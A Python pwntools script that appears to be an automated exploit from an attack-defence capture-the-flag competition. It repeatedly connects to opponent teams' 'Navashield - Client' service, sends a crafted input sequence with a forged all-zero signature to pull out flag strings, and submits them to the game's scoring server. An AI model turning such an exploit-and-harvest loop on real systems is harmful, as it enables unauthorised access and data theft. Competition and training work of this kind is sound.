#!/usr/bin/env python3
from pwn import *
import time
import requests
import json

def getFlagIds():
    ids = requests.get("https://web.ad.teameurope.space/competition/teams.json").json()
    flagIds = dict()
    

    chal = ids['flag_ids']["Navashield - Client"]

    # print(json.dumps(chal,indent=4))

    for i in range(1,26):
        flagIds[str(i)] = list()
        if i == 17:
            continue
        try:
            temp = chal[str(i)]
        except:
            continue
        for line in temp:
            flagIds[str(i)].append(line)
    return flagIds

submittedFlags = []
while True:

    flags = []
    flagIds = getFlagIds()
    for i in range(18,26):
        if str(i) in flagIds.keys():
            for id in flagIds[str(i)]:
                if i == 17:
                    continue
                try:
                    r = remote(f"10.20.{str(i)}.6",5000)
                    # r = remote(f"10.20.18.6",5000)
                except:
                    break
                try:
                    
                    r.recvuntil(b"> ")
                except:
                    r.close()
                    continue

                try:
                    r.sendline("2")

                    print(r.recvuntil(b"Thread ID: "))

                    # id = flagIds["18"][0]

                    r.sendline(id)

                    print(r.recv())

                    r.sendline("ao&")

                    sign = r.recvuntil(b"Signature: ")
                    print(sign)

                    r.sendline("000000")

                    print(r.recvuntil(b"Attachment 0: "))

                    r.sendline("")

                    try:
                        temp = r.recvuntil(b"[3] Exit").decode()
                    except:
                        r.close()
                        continue

                except:
                    r.close()
                    continue

                print(temp)
                
                if "ICC_" in temp:
                    flag = temp.split("Here is the information you requested: ")[1].split("\n")[0]
                    flags.append(flag)
                
                r.close()

    r = remote("10.20.151.1", 31111)
    print(r.recvuntil(b"One flag per line please!\n\n"))

    for flag in flags:
        if flag in submittedFlags:
            continue

        r.sendline(flag)
        print(r.recvline()) # messages / errors
        submittedFlags.append(flag)

    r.close()

    time.sleep(100)
